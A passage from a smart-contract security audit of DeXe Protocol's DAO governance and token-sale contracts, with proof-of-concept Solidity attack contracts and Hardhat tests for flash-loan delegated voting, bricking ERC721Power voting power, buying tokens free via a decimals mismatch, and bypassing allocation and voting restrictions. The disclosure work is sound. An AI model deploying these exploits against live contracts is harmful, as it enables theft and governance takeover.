            // exchangeRate         : 1 sale token for every 1 purchaseToken
            //
            // purchaseToken3 has 6 decimal places
            //
            // mint purchase tokens to owner 1000 in 6 decimal places
            //                        1000 000000
            let buyerInitTokens6Dec = 1000000000;

            await purchaseToken3.mint(OWNER, buyerInitTokens6Dec);
            await purchaseToken3.approve(tsp.address, buyerInitTokens6Dec, { from: OWNER });

            //
            // start: buyer has bought no tokens
            let TIER9 = 9;
            let purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER9]))[0].purchaseView;
            assert.equal(purchaseView.claimTotalAmount, wei(0));

            // buyer attempts to purchase using 100 purchaseToken3 tokens
            // purchaseToken3 has 6 decimals but all inputs to Dexe should be in
            // 18 decimals, so buyer formats input amount to 18 decimals
            // doing this first to verify it works correctly
            let buyInput18Dec = wei("100");
            await tsp.buy(TIER9, purchaseToken3.address, buyInput18Dec);

            // buyer has bought wei(100) sale tokens
            purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER9]))[0].purchaseView;
            assert.equal(purchaseView.claimTotalAmount, buyInput18Dec);

            // buyer has 900 000000 remaining purchaseToken3 tokens
            assert.equal((await purchaseToken3.balanceOf(OWNER)).toFixed(), "900000000");

            // next buyer attempts to purchase using 100 purchaseToken3 tokens
            // but sends input formatted into native 6 decimals
            // sends 6 decimal input: 100 000000
            let buyInput6Dec = 100000000;
            await tsp.buy(TIER9, purchaseToken3.address, buyInput6Dec);

            // buyer has bought an additional 100000000 sale tokens
            purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER9]))[0].purchaseView;
            assert.equal(purchaseView.claimTotalAmount, "100000000000100000000");

            // but the buyer still has 900 000000 remaining purchasetoken3 tokens
            assert.equal((await purchaseToken3.balanceOf(OWNER)).toFixed(), "900000000");

            // by sending the input amount formatted to 6 decimal places,
            // the buyer was able to buy small amounts of the token being sold
            // for free!
          });
```

Finally run the test with: `npx hardhat test --grep "audit buy implicitly assumes that buy token has 18 decimals resulting in loss to DAO"`

**Recommended Mitigation:** There are at least 2 options for mitigating this issue:

Option 1 - revise the design decision that all token amounts must be sent in 18 decimals even if the underlying token decimals are not 18, to instead that all token amounts should be sent in their native decimals and Dexe will convert everything.

Option 2 - keep current design but revert if `amount.from18(token.decimals()) == 0` in [L90](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/token-sale-proposal/TokenSaleProposalBuy.sol#L90) or alternatively use the [`from18Safe()`](https://github.com/dl-solarity/solidity-lib/blob/master/contracts/libs/utils/DecimalsConverter.sol#L124) function which uses [`_convertSafe()`](https://github.com/dl-solarity/solidity-lib/blob/master/contracts/libs/utils/DecimalsConverter.sol#L248) that reverts if the conversion is 0.

The project team should also examine other areas where the same pattern occurs which may have the same vulnerability and where it may be required to revert if the conversion returns 0:

* `GovUserKeeper` [L92](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L92), [L116](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L116), [L183](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L183)
* `GovPool` [L248](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/GovPool.sol#L248)
* `TokenSaleProposalWhitelist` [L50](https://github.com/dexe-network/DeXe-Protocol/blob/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/token-sale-proposal/TokenSaleProposalWhitelist.sol#L50)
* `ERC721Power` [L113](https://github.com/dexe-network/DeXe-Protocol/blob/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L113), [L139](https://github.com/dexe-network/DeXe-Protocol/blob/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L139)
* `TokenBalance` [L35](https://github.com/dexe-network/DeXe-Protocol/blob/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/utils/TokenBalance.sol#L35), [L62](https://github.com/dexe-network/DeXe-Protocol/blob/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/utils/TokenBalance.sol#L62)

**Dexe:**
Fixed in commit [c700d9f](https://github.com/dexe-network/DeXe-Protocol/commit/c700d9f9f328d1df853891b52fd3527b56a6f1df).

**Cyfrin:** Verified. While other places have been changed, `TokenBalance::sendFunds()` still uses `from18()` instead of `from18Safe()` & other parts of the codebase which allow user input when calling `TokenBalance::sendFunds()` directly could be impacted by a similar issue.

For example `TokenSaleProposalWhitelist::unlockParticipationTokens()` - if users try to unlock a small enough amount of locked tokens which are in 6 decimal precision, state will be updated as if the unlock was successful but the resulting conversion in `TokenBalance::sendFunds()` will round down to 0. Execution will continue & zero tokens will be transferred to the user but since storage has been updated those tokens will remain forever locked.

Dexe should carefully consider if there exists any valid situations where the `from18()` conversion in `TokenBalance::sendFunds()` should round an input > 0 to 0, and the transaction should not revert but continue executing transferring 0 tokens? Cyfrin recommends that the "default" conversion to use is `from18Safe()` and that `from18()` should only be used where conversions to 0 are explicitly allowed.


### Attacker can combine flashloan with delegated voting to decide a proposal and withdraw their tokens while the proposal is still in Locked state

**Description:** Attacker can combine a flashloan with delegated voting to bypass the existing flashloan mitigations, allowing the attacker to decide a proposal & withdraw their tokens while the proposal is still in the Locked state. The entire attack can be performed in 1 transaction via an attack contract.

**Impact:** Attacker can bypass existing flashloan mitigations to decide the outcome of proposals by combining flashloan with delegated voting.

**Proof of Concept:** Add the attack contract to `mock/utils/FlashDelegationVoteAttack.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "../../interfaces/gov/IGovPool.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract FlashDelegationVoteAttack {
    //
    // how the attack contract works:
    //
    // 1) use flashloan to acquire large amount of voting tokens
    //    (caller transfer tokens to contract before calling to simplify PoC)
    // 2) deposit voting tokens into GovPool
    // 3) delegate voting power to slave contract
    // 4) slave contract votes with delegated power
    // 5) proposal immediately reaches quorum and moves into Locked state
    // 6) undelegate voting power from slave contract
    //    since undelegation works while Proposal is in locked state
    // 7) withdraw voting tokens from GovPool while proposal still in Locked state
    // 8) all in 1 txn
    //

    function attack(address govPoolAddress, address tokenAddress, uint256 proposalId) external {
        // verify that the attack contract contains the voting tokens
        IERC20 votingToken = IERC20(tokenAddress);

        uint256 votingPower = votingToken.balanceOf(address(this));
        require(votingPower > 0, "AttackContract: need to send tokens first");

        // create the slave contract that this contract will delegate to which
        // will do the actual vote
        FlashDelegationVoteAttackSlave slave = new FlashDelegationVoteAttackSlave();

        // deposit our tokens with govpool
        IGovPool govPool = IGovPool(govPoolAddress);

        // approval first
        (, address userKeeperAddress, , , ) = govPool.getHelperContracts();
        votingToken.approve(userKeeperAddress, votingPower);

        // then actual deposit
        govPool.deposit(address(this), votingPower, new uint256[](0));

        // verify attack contract has no tokens
        require(
            votingToken.balanceOf(address(this)) == 0,
            "AttackContract: balance should be 0 after depositing tokens"
        );

        // delegate our voting power to the slave
        govPool.delegate(address(slave), votingPower, new uint256[](0));

        // slave does the actual vote
        slave.vote(govPool, proposalId);

        // verify proposal now in Locked state as quorum was reached
        require(
            govPool.getProposalState(proposalId) == IGovPool.ProposalState.Locked,
            "AttackContract: proposal didnt move to Locked state after vote"
        );

        // undelegate our voting power from the slave
        govPool.undelegate(address(slave), votingPower, new uint256[](0));

        // withdraw our tokens
        govPool.withdraw(address(this), votingPower, new uint256[](0));

        // verify attack contract has withdrawn all tokens used in the delegated vote
        require(
            votingToken.balanceOf(address(this)) == votingPower,
            "AttackContract: balance should be full after withdrawing"
        );

        // verify proposal still in the Locked state
        require(
            govPool.getProposalState(proposalId) == IGovPool.ProposalState.Locked,
            "AttackContract: proposal should still be in Locked state after withdrawing tokens"
        );

        // attack contract can now repay flash loan
    }
}

contract FlashDelegationVoteAttackSlave {
    function vote(IGovPool govPool, uint256 proposalId) external {
        // slave has no voting power so votes 0, this will automatically
        // use the delegated voting power
        govPool.vote(proposalId, true, 0, new uint256[](0));
    }
}
```

Add the unit test to `GovPool.test.js` under `describe("getProposalState()", () => {`:
```javascript
      it("audit attacker combine flash loan with delegation to decide vote then immediately withdraw loaned tokens by undelegating", async () => {
        await changeInternalSettings(false);

        // setup the proposal
        let proposalId = 2;
        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(proposalId, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(proposalId, wei("100"), [], false)]]
        );

        assert.equal(await govPool.getProposalState(proposalId), ProposalState.Voting);

        // setup the attack contract
        const AttackContractMock = artifacts.require("FlashDelegationVoteAttack");
        let attackContract = await AttackContractMock.new();

        // give SECOND's tokens to the attack contract
        let voteAmt = wei("100000000000000000000");
        await govPool.withdraw(attackContract.address, voteAmt, [], { from: SECOND });

        // execute the attack
        await attackContract.attack(govPool.address, token.address, proposalId);
      });
```

Run the test with: `npx hardhat test --grep "audit attacker combine flash loan with delegation"`.

**Recommended Mitigation:** Consider additional defensive measures such as not allowing delegation/undelegation & deposit/withdrawal in the same block.

**Dexe:**
Fixed in [PR166](https://github.com/dexe-network/DeXe-Protocol/commit/30b56c87c6c4902ec5a4c470d8a2812cd43dc53c).

**Cyfrin:** Verified.


### Attacker can destroy user voting power by setting `ERC721Power::totalPower` and all existing NFTs `currentPower` to 0

**Description:** Attacker can destroy user voting power by setting `ERC721Power::totalPower` & all existing nfts' `currentPower` to 0 via a permission-less attack contract by exploiting a discrepancy ("<" vs "<=") in `ERC721Power` [L144](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L144) & [L172](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L172):

```solidity
function recalculateNftPower(uint256 tokenId) public override returns (uint256 newPower) {
    // @audit execution allowed to continue when
    // block.timestamp == powerCalcStartTimestamp
    if (block.timestamp < powerCalcStartTimestamp) {
        return 0;
    }
    // @audit getNftPower() returns 0 when
    // block.timestamp == powerCalcStartTimestamp
    newPower = getNftPower(tokenId);

    NftInfo storage nftInfo = nftInfos[tokenId];

    // @audit as this is the first update since power
    // calculation has just started, totalPower will be
    // subtracted by nft's max power
    totalPower -= nftInfo.lastUpdate != 0 ? nftInfo.currentPower : getMaxPowerForNft(tokenId);
    // @audit totalPower += 0 (newPower = 0 in above line)
    totalPower += newPower;

    nftInfo.lastUpdate = uint64(block.timestamp);
    // @audit will set nft's current power to 0
    nftInfo.currentPower = newPower;
}

function getNftPower(uint256 tokenId) public view override returns (uint256) {
    // @audit execution always returns 0 when
    // block.timestamp == powerCalcStartTimestamp
    if (block.timestamp <= powerCalcStartTimestamp) {
        return 0;
```
This attack has to be run on the exact block that power calculation starts (when `block.timestamp == ERC721Power.powerCalcStartTimestamp`).

**Impact:** `ERC721Power::totalPower` & all existing nft's `currentPower` are set 0, negating voting using `ERC721Power` since [`totalPower` is read when creating the snapshot](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L330-L331) and [`GovUserKeeper::getNftsPowerInTokensBySnapshot()` will return 0](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L546-L548) same as if the nft contract didn't exist. Can also negatively affect the ability to [create proposals](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L604-L606).

This attack is extremely devastating as the individual power of `ERC721Power` nfts can never be increased; it can only decrease over time if the required collateral is not deposited. By setting all nfts' `currentPower = 0` as soon as power calculation starts (`block.timestamp == ERC721Power.powerCalcStartTimestamp`) the `ERC721Power` contract is effectively completely bricked - there is no way to "undo" this attack unless the nft contract is replaced with a new contract.

Dexe-DAO can be created [using only nfts for voting](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L74); in this case this exploit which completely bricks the voting power of all nfts means a new DAO has to be re-deployed since no one can vote as everyone's voting power has been destroyed.

**Proof of Concept:** Add attack contract `mock/utils/ERC721PowerAttack.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "../../gov/ERC721/ERC721Power.sol";

import "hardhat/console.sol";

contract ERC721PowerAttack {
    // this attack can decrease ERC721Power::totalPower by the the true max power of all
    // the power nfts that exist (to zero), regardless of who owns them, and sets the current
    // power of all nfts to zero, totally bricking the ERC721Power contract.
    //
    // this attack only works when block.timestamp == nftPower.powerCalcStartTimestamp
    // as it takes advantage of a difference in getNftPower() & recalculateNftPower():
    //
    // getNftPower() returns 0 when block.timestamp <= powerCalcStartTimestamp
    // recalculateNftPower returns 0 when block.timestamp < powerCalcStartTimestamp
    function attack(
        address nftPowerAddr,
        uint256 initialTotalPower,
        uint256 lastTokenId
    ) external {
        ERC721Power nftPower = ERC721Power(nftPowerAddr);

        // verify attack starts on the correct block
        require(
            block.timestamp == nftPower.powerCalcStartTimestamp(),
            "ERC721PowerAttack: attack requires block.timestamp == nftPower.powerCalcStartTimestamp"
        );

        // verify totalPower() correct at starting block
        require(
            nftPower.totalPower() == initialTotalPower,
            "ERC721PowerAttack: incorrect initial totalPower"
        );

        // call recalculateNftPower() for every nft, this:
        // 1) decreases ERC721Power::totalPower by that nft's max power
        // 2) sets that nft's currentPower = 0
        for (uint256 i = 1; i <= lastTokenId; ) {
            require(
                nftPower.recalculateNftPower(i) == 0,
                "ERC721PowerAttack: recalculateNftPower() should return 0 for new nft power"
            );

            unchecked {
                ++i;
            }
        }

        require(
            nftPower.totalPower() == 0,
            "ERC721PowerAttack: after attack finished totalPower should equal 0"
        );
    }
}
```

Add test harness to `ERC721Power.test.js`:
```javascript
    describe("audit attacker can manipulate ERC721Power totalPower", () => {
      it("audit attack 1 sets ERC721Power totalPower & all nft currentPower to 0", async () => {
        // deploy the ERC721Power nft contract with:
        // max power of each nft = 100
        // power reduction 10%
        // required collateral = 100
        let maxPowerPerNft = toPercent("100");
        let requiredCollateral = wei("100");
        let powerCalcStartTime = (await getCurrentBlockTime()) + 1000;
        // hack needed to start attack contract on exact block due to hardhat
        // advancing block.timestamp in the background between function calls
        let powerCalcStartTime2 = (await getCurrentBlockTime()) + 999;

        // create power nft contract
        await deployNft(powerCalcStartTime, maxPowerPerNft, toPercent("10"), requiredCollateral);

        // ERC721Power::totalPower should be zero as no nfts yet created
        assert.equal((await nft.totalPower()).toFixed(), toPercent("0").times(1).toFixed());

        // create the attack contract
        const ERC721PowerAttack = artifacts.require("ERC721PowerAttack");
        let attackContract = await ERC721PowerAttack.new();

        // create 10 power nfts for SECOND
        await nft.safeMint(SECOND, 1);
        await nft.safeMint(SECOND, 2);
        await nft.safeMint(SECOND, 3);
        await nft.safeMint(SECOND, 4);
        await nft.safeMint(SECOND, 5);
        await nft.safeMint(SECOND, 6);
        await nft.safeMint(SECOND, 7);
        await nft.safeMint(SECOND, 8);
        await nft.safeMint(SECOND, 9);
        await nft.safeMint(SECOND, 10);

        // verify ERC721Power::totalPower has been increased by max power for all nfts
        assert.equal((await nft.totalPower()).toFixed(), maxPowerPerNft.times(10).toFixed());

        // fast forward time to the start of power calculation
        await setTime(powerCalcStartTime2);

        // launch the attack
        await attackContract.attack(nft.address, maxPowerPerNft.times(10).toFixed(), 10);
      });
    });
```

Run attack with: `npx hardhat test --grep "audit attack 1 sets ERC721Power totalPower & all nft currentPower to 0"`

**Recommended Mitigation:** Resolve the discrepancy between `ERC721Power` [L144](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L144) & [L172](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L172).

**Dexe:**
Fixed in [PR174](https://github.com/dexe-network/DeXe-Protocol/commit/8c52fe4264d7868ab261ee789d0efe9f4edddfc2).

**Cyfrin:** Verified.

\clearpage
## High Risk


### Under-funded eth distribution proposals can be created causing claiming rewards to revert

**Description:** It is possible to create under-funded eth distribution proposals as `DistributionProposal::execute()` [L62-63](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L62-L63) doesn't check whether `amount == msg.value`. If `msg.value < amount` an under-funded distribution proposal will be executed.

This opens up an attack vector where a malicious GovPool owner can provide fake incentives to users to make them vote on proposals. At the time of reward distribution, owner can simply execute a distribution proposal without sending the promised amount as reward. As a result, users end up voting for a proposal and not getting paid for it.


**Impact:** Users can't claim their rewards as `DistributionProposal::claim()` will revert for under-funded distribution proposals. Since anybody can create a `GovPool`, there is a potential for loss to users due to malicious intent.

**Proof of Concept:** Add this PoC to `test/gov/proposals/DistributionProposal.test.js` under the section `describe("claim()", () => {`:
```javascript
      it("under-funded eth distribution proposals prevents claiming rewards", async () => {
        // use GovPool to create a proposal with 10 wei reward
        await govPool.createProposal(
          "example.com",
          [[dp.address, wei("10"), getBytesDistributionProposal(1, ETHER_ADDR, wei("10"))]],
          [],
          { from: SECOND }
        );

        // Under-fund the proposal by calling DistributionProposal::execute() with:
        // 1) token     = ether
        // 2) amount    = X
        // 3) msg.value = Y, where Y < X
        //
        // This creates an under-funded proposal breaking the subsequent claim()
        await impersonate(govPool.address);
        await dp.execute(1, ETHER_ADDR, wei("10"), { value: wei(1), from: govPool.address });

        // only 1 vote so SECOND should get the entire 10 wei reward
        await govPool.vote(1, true, 0, [1], { from: SECOND });

        // attempting to claim the reward fails as the proposal is under-funded
        await truffleAssert.reverts(dp.claim(SECOND, [1]), "Gov: failed to send eth");
      });
```

Run with `npx hardhat test --grep "under-funded eth distribution"`

**Recommended Mitigation:** `DistributionProposal::execute()` [L62-63](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L62-L63) should revert if `amount != msg.value` for eth funded proposals.

**Dexe:**
Fixed in [PR164](https://github.com/dexe-network/DeXe-Protocol/commit/cdf9369193e1b2d6640c975d2c8e872710f6e065#diff-9559fcfcd35b0e7d69c24765fb0d5996a7b0b87781860c7f821867c26109814f).

**Cyfrin:** Verified.


### Attacker can bypass token sale `maxAllocationPerUser` restriction to buy out the entire tier

**Description:** An attacker can bypass the token sale `maxAllocationPerUser` restriction to buy out the entire tier by doing multiple small buys under this limit.

**Impact:** Permanent grief for other users who are unable to buy any of the exploited tier's tokens. Depending on the total supply a buyer could take control of the majority of the tokens by scooping them all up in a token sale, preventing them being distributed as intended and having monopoly control of the market. The `maxAllocationPerUser` restriction is not working as intended and can easily be bypassed by anyone.

**Proof of Concept:** First add Tier 8 to `test/gov/proposals/TokenSaleProposal.test.js` [L718](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/test/gov/proposals/TokenSaleProposal.test.js#L718):
```javascript
        {
          metadata: {
            name: "tier 8",
            description: "the eighth tier",
          },
          totalTokenProvided: wei(1000),
          saleStartTime: timeNow.toString(),
          saleEndTime: (timeNow + 10000).toString(),
          claimLockDuration: "0",
          saleTokenAddress: saleToken.address,
          purchaseTokenAddresses: [purchaseToken1.address],
          exchangeRates: [PRECISION.times(4).toFixed()],
          minAllocationPerUser: wei(10),
          maxAllocationPerUser: wei(100),
          vestingSettings: {
            vestingPercentage: "0",
            vestingDuration: "0",
            cliffPeriod: "0",
            unlockStep: "0",
          },
          participationDetails: [],
        },
```

Then add the PoC to the same file under the section `describe("if added to whitelist", () => {` around [L1995](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/test/gov/proposals/TokenSaleProposal.test.js#L1995):
```javascript
          it("attacker can bypass token sale maxAllocationPerUser to buy out the entire tier", async () => {
            await purchaseToken1.approve(tsp.address, wei(1000));

            // tier8 has the following parameters:
            // totalTokenProvided   : wei(1000)
            // minAllocationPerUser : wei(10)
            // maxAllocationPerUser : wei(100)
            // exchangeRate         : 4 sale tokens for every 1 purchaseToken
            //
            // one user should at most be able to buy wei(100),
            // or 10% of the total tier.
            //
            // any user can bypass this limit by doing multiple
            // smaller buys to buy the entire tier.
            //
            // start: user has bought no tokens
            let TIER8 = 8;
            let purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER8]))[0].purchaseView;
            assert.equal(purchaseView.claimTotalAmount, wei(0));

            // if the user tries to buy it all in one txn,
            // maxAllocationPerUser is enforced and the txn reverts
            await truffleAssert.reverts(tsp.buy(TIER8, purchaseToken1.address, wei(250)), "TSP: wrong allocation");

            // but user can do multiple smaller buys to get around the
            // maxAllocationPerUser check which only checks each
            // txn individually, doesn't factor in the total amount
            // user has already bought
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));
            await tsp.buy(TIER8, purchaseToken1.address, wei(25));

            // end: user has bought wei(1000) tokens - the entire tier!
            purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER8]))[0].purchaseView;
            assert.equal(purchaseView.claimTotalAmount, wei(1000));

            // attempting to buy more fails as the entire tier
            // has been bought by the single user
            await truffleAssert.reverts(
              tsp.buy(TIER8, purchaseToken1.address, wei(25)),
              "TSP: insufficient sale token amount"
            );
          });
```

To run the PoC: `npx hardhat test --grep "bypass token sale maxAllocationPerUser"`

**Recommended Mitigation:** `libs/gov/token-sale-proposal/TokenSaleProposalBuy.sol` [L115-120](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/token-sale-proposal/TokenSaleProposalBuy.sol#L115-L120) should add the total amount already purchased by the user in the current tier to the current amount being purchased in the same tier, and ensure this total is `<= maxAllocationPerUser`.

**Dexe:**
Fixed in [PR164](https://github.com/dexe-network/DeXe-Protocol/commit/cdf9369193e1b2d6640c975d2c8e872710f6e065#diff-4cd963fe9cc6a9ca86a4c9a2dc8577b8c35f60690c9b9cbffca7a2b551dec99e).  We also changed how `exchageRate` works. So it was "how many sale tokens per purchase token", now it is "how many purchase tokens per sale token".

**Cyfrin:** Verified; changed our PoC exchange rate to 1:1.



### A malicious DAO Pool can create a token sale tier without actually transferring any DAO tokens

**Description:** `TokenSaleProposalCreate::createTier` is called by a DAO Pool owner to create a new token sale tier. A fundamental prerequisite for creating a tier is that the DAO Pool owner must transfer the `totalTokenProvided` amount of DAO tokens to the `TokenSaleProposal`.

Current implementation implements a low-level call to transfer tokens from `msg.sender(GovPool)` to `TokenSaleProposal` contract. However, the implementation fails to validate the token balances after the transfer is successful. We notice a `dev` comment stating "return value is not checked intentionally" - even so, this vulnerability is not related to checking return `status` but to verifying the contract balances before & after the call.

```solidity
function createTier(
        mapping(uint256 => ITokenSaleProposal.Tier) storage tiers,
        uint256 newTierId,
        ITokenSaleProposal.TierInitParams memory _tierInitParams
    ) external {

       ....
         /// @dev return value is not checked intentionally
  >      tierInitParams.saleTokenAddress.call(
            abi.encodeWithSelector(
                IERC20.transferFrom.selector,
                msg.sender,
                address(this),
                totalTokenProvided
            )
        );  //@audit -> no check if the contract balance has increased proportional to the totalTokenProvided
   }
```

Since a DAO Pool owner can use any ERC20 as a DAO token, it is possible for a malicious Gov Pool owner to implement a custom ERC20 implementation of a token that overrides the `transferFrom` function. This function can override the standard ERC20 `transferFrom` logic that fakes a successful transfer without actually transferring underlying tokens.

**Impact:** A fake tier can be created without the proportionate amount of DAO Pool token balance in the `TokenSaleProposal` contract. Naive users can participate in such a token sale assuming their DAO token claims will be honoured at a future date. Since the pool has insufficient token balance, any attempts to claim the DAO pool tokens can lead to a permanent DOS.

**Recommended Mitigation:** Calculate the contract balance before and after the low-level call and verify if the account balance increases by `totalTokenProvided`. Please be mindful that this check is only valid for non-fee-on-transfer tokens. For fee-on-transfer tokens, the balance increase needs to be further adjusted for the transfer fees. Example code for non-free-on-transfer-tokens:
```solidity
        // transfer sale tokens to TokenSaleProposal and validate the transfer
        IERC20 saleToken = IERC20(_tierInitParams.saleTokenAddress);

        // record balance before transfer in 18 decimals
        uint256 balanceBefore18 = saleToken.balanceOf(address(this)).to18(_tierInitParams.saleTokenAddress);

        // perform the transfer
        saleToken.safeTransferFrom(
            msg.sender,
            address(this),
            _tierInitParams.totalTokenProvided.from18Safe(_tierInitParams.saleTokenAddress)
        );

        // record balance after the transfer in 18 decimals
        uint256 balanceAfter18 = saleToken.balanceOf(address(this)).to18(_tierInitParams.saleTokenAddress);

        // verify that the transfer has actually occured to protect users from malicious
        // sale tokens that don't actually send the tokens for the token sale
        require(balanceAfter18 - balanceBefore18 == _tierInitParams.totalTokenProvided,
                "TSP: token sale proposal creation received incorrect amount of tokens"
        );
```

**Dexe:**
Fixed in [PR177](https://github.com/dexe-network/DeXe-Protocol/commit/64bbcf5b1575e88ead4e5fd58d8ee210a815aad6).

**Cyfrin:** The fix changed from using `transferFrom` to `safeTransferFrom` however the recommendation requires that the actual balance be checked before and after the transfer to verify the correct amount of tokens have actually been transferred.


### Attacker can use delegation to bypass voting restriction to vote on proposals they are restricted from voting on

**Description:** Attacker can use delegation to bypass voting restriction to vote on proposals they are restricted from voting on.

**Impact:** Attacker can vote on proposals they are restricted from voting on.

**Proof of Concept:** Add PoC to `GovPool.test.js` under section `describe("vote()", () => {`:
```javascript
      it("audit bypass user restriction on voting via delegation", async () => {
        let votingPower = wei("100000000000000000000");
        let proposalId  = 1;

        // create a proposal where SECOND is restricted from voting
        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesUndelegateTreasury(SECOND, 1, [])]],
          []
        );

        // if SECOND tries to vote directly this fails
        await truffleAssert.reverts(
          govPool.vote(proposalId, true, votingPower, [], { from: SECOND }),
          "Gov: user restricted from voting in this proposal"
        );

        // SECOND has another address SLAVE which they control
        let SLAVE = await accounts(10);

        // SECOND delegates their voting power to SLAVE
        await govPool.delegate(SLAVE, votingPower, [], { from: SECOND });

        // SLAVE votes on the proposal; votes "0" as SLAVE has no
        // personal voting power, only the delegated power from SECOND
        await govPool.vote(proposalId, true, "0", [], { from: SLAVE });

        // verify SLAVE's voting
        assert.equal(
          (await govPool.getUserVotes(proposalId, SLAVE, VoteType.PersonalVote)).totalRawVoted,
          "0" // personal votes remain the same
        );
        assert.equal(
          (await govPool.getUserVotes(proposalId, SLAVE, VoteType.MicropoolVote)).totalRawVoted,
          votingPower // delegated votes from SECOND now included
        );
        assert.equal(
          (await govPool.getTotalVotes(proposalId, SLAVE, VoteType.PersonalVote))[0].toFixed(),
          votingPower // delegated votes from SECOND now included
        );

        // SECOND was able to abuse delegation to vote on a proposal they were
        // restricted from voting on.
      });
```

Run with: `npx hardhat test --grep "audit bypass user restriction on voting via delegation"`

**Recommended Mitigation:** Rework the voting restriction mechanism such that attackers can't abuse the delegation system to vote on proposals they are prohibited from voting on.

**Dexe:**
Fixed in [PR168](https://github.com/dexe-network/DeXe-Protocol/commit/01bc28e89a99da5f7b67d6645c935f7230a8dc7b).

**Cyfrin:** Verified.


### Delegators incorrectly receive less rewards for longer proposals with multiple delegations

**Description:** Delegators incorrectly receive less rewards for longer proposals with multiple delegations as [retrieving the expected rewards](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-pool/GovPoolMicropool.sol#L145-L157) from the list of delegations will fail to retrieve the entire delegated amount when multiple delegations occur from the same delegator to the same delegatee over separate blocks.

**Impact:** Delegators will receive less rewards than they should.

**Proof of Concept:** Consider this scenario:

2 Proposals that have a longer active timeframe with an `endDate` 2 months from now.

Proposal 1, Delegator delegates full voting power to Delegatee who votes, deciding proposal 1. Proposal 1 gets executed, both delegatee & delegator get paid their correct rewards.

Proposal 2, Delegator delegates half their voting power to Delegatee who votes but these votes aren't enough to decide the proposal. One month passes & the proposal is still active as it goes for 2 months.

Delegator delegates the second half of their voting power to Delegatee. This triggers the automatic `revoteDelegated` such that Delegatee votes with the full voting power of Delegator which is enough to decide proposal 2.

Proposal 2 is then executed. Delegatee gets paid the full rewards for using Delegator's full voting power, but Delegator only receives *HALF* of the rewards they should get, even though they delegated their full voting power which was used to decide the proposal.

Here is where it gets even more interesting; if instead of doing the second half-power delegation, Delegator undelegates the remaining amount then delegates the full amount and then Delegatee votes, Delegator gets paid the full rewards. But if delegator delegates in multiple (2 txns) with a month of time elapsing between them, they only get paid half the rewards.

First add this helper function in `GovPool.test.js` under section `describe("Fullfat GovPool", () => {`:
```javascript
    async function changeInternalSettings2(validatorsVote, duration) {
